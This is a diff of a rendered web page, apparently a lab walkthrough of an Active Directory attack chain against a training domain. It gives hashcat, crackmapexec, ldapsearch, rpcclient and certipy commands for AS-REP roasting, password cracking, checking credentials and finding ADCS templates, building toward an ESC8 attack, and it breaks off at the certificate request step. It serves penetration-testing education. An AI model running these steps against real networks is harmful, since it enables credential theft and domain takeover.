class="token plain"> hashcat \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -outputfile asrep_hashes.txt</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">GetNPUsers.py sevenkingdoms.local/ \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -usersfile userlist.txt \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -format hashcat \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -outputfile asrep_hashes.txt</span><br></div></code></pre></div></div>
 <p>Then check what you got:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">wc</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -l asrep_hashes.txt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">head</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -n 5 asrep_hashes.txt</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">wc -l asrep_hashes.txt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">head -n 5 asrep_hashes.txt</span><br></div></code></pre></div></div>
 <p>Press enter or click to view image in full size</p>
 <img src="https://cdn-images-1.medium.com/max/800/0*6cgGgYsn0d90hkIl.png" alt="Article image" width="700" height="52" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-crack-with-hashcat-as-rep-roast">2) Crack with hashcat (AS-REP roast)<a href="#2-crack-with-hashcat-as-rep-roast" class="hash-link" aria-label="Direct link to 2) Crack with hashcat (AS-REP roast)" title="Direct link to 2) Crack with hashcat (AS-REP roast)" translate="no">​</a></h3>
 <p>[<strong>Breaking the Code: How to Use Hashcat for Effective Password Cracking</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2024/2024-11-03-breaking-the-code-how-to-use-hashcat-for-effective-password-cracking-15f8da8facb8">Your step-by-step guide to mastering Hashcat, from setting it up on your system to deploying it against complex…</a></p>
-<p>Hashcat mode for<code>$krb5asrep$23$...</code>is typically<strong>18200</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">hashcat -m </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">18200</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">a</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> asrep_hashes</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.txt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> /path/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/wordlist</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.txt</span><br></div></code></pre></div></div>
+<p>Hashcat mode for <code>$krb5asrep$23$...</code> is typically <strong>18200</strong>:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 18200 -a 0 asrep_hashes.txt /path/to/wordlist.txt</span><br></div></code></pre></div></div>
 <p>Press enter or click to view image in full size</p>
 <img src="https://cdn-images-1.medium.com/max/800/0*D87Buy90Hup7z3Fn.png" alt="Article image" width="700" height="223" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cracked-testuserpassword123">Cracked: TestUser@Password123!<a href="#cracked-testuserpassword123" class="hash-link" aria-label="Direct link to Cracked: TestUser@Password123!" title="Direct link to Cracked: TestUser@Password123!" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-05-verify-credentials">Step 0.5: Verify Credentials<a href="#step-05-verify-credentials" class="hash-link" aria-label="Direct link to Step 0.5: Verify Credentials" title="Direct link to Step 0.5: Verify Credentials" translate="no">​</a></h3>
-<p>**Objective:**Confirm obtained credentials work before proceeding.</p>
+<p><strong>Objective:</strong> Confirm obtained credentials work before proceeding.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test LDAP authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">x</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -H ldap:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;TestUser@sevenkingdoms.local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Password123!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;DC=sevenkingdoms,DC=local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;(objectClass=user)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sAMAccountName | head -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">20</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Test with CrackMapExec</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -u TestUser \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -d sevenkingdoms.local</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test LDAP authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H ldap://192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D &quot;TestUser@sevenkingdoms.local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w &quot;Password123!&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b &quot;DC=sevenkingdoms,DC=local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;(objectClass=user)&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sAMAccountName | head -20</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Test with CrackMapExec</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -u TestUser \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p &#x27;Password123!&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -d sevenkingdoms.local</span><br></div></code></pre></div></div>
 <p><strong>Expected Output:</strong></p>
 <img src="https://cdn-images-1.medium.com/max/800/1*EK_9iyuhhnIumCBYEzN-lw.png" alt="Article image" width="1643" height="761" loading="lazy" decoding="async">
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">SMB         </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">445</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    KINGSLANDING     </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[+]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">\TestUser:Password123!</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\TestUser:Password123!</span><br></div></code></pre></div></div>
 <p><strong>Success Indicators:</strong></p>
 <ul>
 <li class="">
@@ -563,13 +563,13 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <p>✅ Can enumerate domain objects</p>
 </li>
 <li class="">
-<p>✅<strong>Ready for ESC8 attack</strong></p>
+<p>✅ <strong>Ready for ESC8 attack</strong></p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-06-enumerate-user-privileges-optional">Step 0.6: Enumerate User Privileges (Optional)<a href="#step-06-enumerate-user-privileges-optional" class="hash-link" aria-label="Direct link to Step 0.6: Enumerate User Privileges (Optional)" title="Direct link to Step 0.6: Enumerate User Privileges (Optional)" translate="no">​</a></h2>
-<p>**Objective:**Understand what the obtained account can do.</p>
+<p><strong>Objective:</strong> Understand what the obtained account can do.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Check group memberships</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">x</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -H ldap:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;TestUser@sevenkingdoms.local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Password123!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;DC=sevenkingdoms,DC=local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;(sAMAccountName=TestUser)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  memberOf</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Check user privileges</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;TestUser%Password123!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -c </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;queryuser TestUser&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Check group memberships</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H ldap://192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D &quot;TestUser@sevenkingdoms.local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w &quot;Password123!&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b &quot;DC=sevenkingdoms,DC=local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;(sAMAccountName=TestUser)&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  memberOf</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Check user privileges</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U &quot;TestUser%Password123!&quot; 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -c &quot;queryuser TestUser&quot;</span><br></div></code></pre></div></div>
 <p><strong>What to Check:</strong></p>
 <ul>
 <li class="">
@@ -596,7 +596,7 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-credential-discovery-workflow">Summary: Credential Discovery Workflow<a href="#summary-credential-discovery-workflow" class="hash-link" aria-label="Direct link to Summary: Credential Discovery Workflow" title="Direct link to Summary: Credential Discovery Workflow" translate="no">​</a></h2>
 <p><strong>Complete Process:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">1.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Port Scan (nmap)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Identify Domain Controller</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Discover Domain Name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; LDAP anonymous bind / SMB null session</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Enumerate Users</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; RID cycling / LDAP enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Password Attacks (in order):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; Password Spraying (low risk)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; ASREPRoasting (no password needed)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; Kerberoasting (if have one account)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Brute Force (last resort)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Verify Credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Test SMB/LDAP authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Proceed to ESC8 Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Use obtained credentials</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">1. Port Scan (nmap)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Identify Domain Controller</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2. Discover Domain Name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; LDAP anonymous bind / SMB null session</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3. Enumerate Users</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; RID cycling / LDAP enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4. Password Attacks (in order):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; Password Spraying (low risk)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; ASREPRoasting (no password needed)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   ├─&gt; Kerberoasting (if have one account)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Brute Force (last resort)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5. Verify Credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Test SMB/LDAP authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6. Proceed to ESC8 Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   └─&gt; Use obtained credentials</span><br></div></code></pre></div></div>
 <p><strong>Expected Timeline:</strong></p>
 <ul>
 <li class="">
@@ -629,9 +629,9 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance and Enumeration<a href="#phase-1-reconnaissance-and-enumeration" class="hash-link" aria-label="Direct link to Phase 1: Reconnaissance and Enumeration" title="Direct link to Phase 1: Reconnaissance and Enumeration" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-11-discover-adcs-infrastructure">Step 1.1: Discover ADCS Infrastructure<a href="#step-11-discover-adcs-infrastructure" class="hash-link" aria-label="Direct link to Step 1.1: Discover ADCS Infrastructure" title="Direct link to Step 1.1: Discover ADCS Infrastructure" translate="no">​</a></h3>
-<p>**Objective:**Identify if ADCS is installed and locate the Certificate Authority.</p>
+<p><strong>Objective:</strong> Identify if ADCS is installed and locate the Certificate Authority.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">find</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -u TestUser@sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy find -u TestUser@sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p &#x27;Password123!&#x27; -dc-ip 192.168.56.10 </span><br></div></code></pre></div></div>
 <p><strong>What to Look For:</strong></p>
 <ul>
 <li class="">
@@ -662,9 +662,9 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-12-enumerate-certificate-templates">Step 1.2: Enumerate Certificate Templates<a href="#step-12-enumerate-certificate-templates" class="hash-link" aria-label="Direct link to Step 1.2: Enumerate Certificate Templates" title="Direct link to Step 1.2: Enumerate Certificate Templates" translate="no">​</a></h3>
-<p>**Objective:**Find vulnerable certificate templates that allow client authentication.</p>
+<p><strong>Objective:</strong> Find vulnerable certificate templates that allow client authentication.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">find</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -u TestUser@sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -vulnerable</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy find -u TestUser@sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p &#x27;Password123!&#x27; -dc-ip 192.168.56.10 -vulnerable</span><br></div></code></pre></div></div>
 <p><strong>What to Look For:</strong></p>
 <ul>
 <li class="">
@@ -680,17 +680,17 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <p><strong>Key Templates:</strong></p>
 <ul>
 <li class="">
-<p><strong>ESC1</strong>— Often misconfigured, allows client authentication</p>
+<p><strong>ESC1</strong> — Often misconfigured, allows client authentication</p>
 </li>
 <li class="">
-<p><strong>WebServer</strong>— May allow client authentication</p>
+<p><strong>WebServer</strong> — May allow client authentication</p>
 </li>
 <li class="">
-<p><strong>User</strong>— Default template, check permissions</p>
+<p><strong>User</strong> — Default template, check permissions</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-13-verify-http-endpoint-accessibility">Step 1.3: Verify HTTP Endpoint Accessibility<a href="#step-13-verify-http-endpoint-accessibility" class="hash-link" aria-label="Direct link to Step 1.3: Verify HTTP Endpoint Accessibility" title="Direct link to Step 1.3: Verify HTTP Endpoint Accessibility" translate="no">​</a></h3>
-<p>**Objective:**Confirm the ADCS HTTP endpoint is accessible.</p>
+<p><strong>Objective:</strong> Confirm the ADCS HTTP endpoint is accessible.</p>
 <p><strong>Command:</strong></p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -k http://192.168.56.10/certsrv/</span><br></div></code></pre></div></div>
 <p><strong>Expected Response:</strong></p>
@@ -714,7 +714,7 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-2-certificate-request-direct-method">Phase 2: Certificate Request (Direct Method)<a href="#phase-2-certificate-request-direct-method" class="hash-link" aria-label="Direct link to Phase 2: Certificate Request (Direct Method)" title="Direct link to Phase 2: Certificate Request (Direct Method)" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-21-request-certificate-using-low-privilege-credentials">Step 2.1: Request Certificate Using Low-Privilege Credentials<a href="#step-21-request-certificate-using-low-privilege-credentials" class="hash-link" aria-label="Direct link to Step 2.1: Request Certificate Using Low-Privilege Credentials" title="Direct link to Step 2.1: Request Certificate Using Low-Privilege Credentials" translate="no">​</a></h3>
-<p>**Objective:**Obtain a certificate for a high-privilege account using low-privilege credentials.</p>
+<p><strong>Objective:</strong> Obtain a certificate for a high-privilege account using low-privilege credentials.</p>
 <p><strong>Prerequisites:</strong></p>
 <ul>
 <li class="">
@@ -728,29 +728,29 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </li>
 </ul>
 <p><strong>Command:</strong></p>
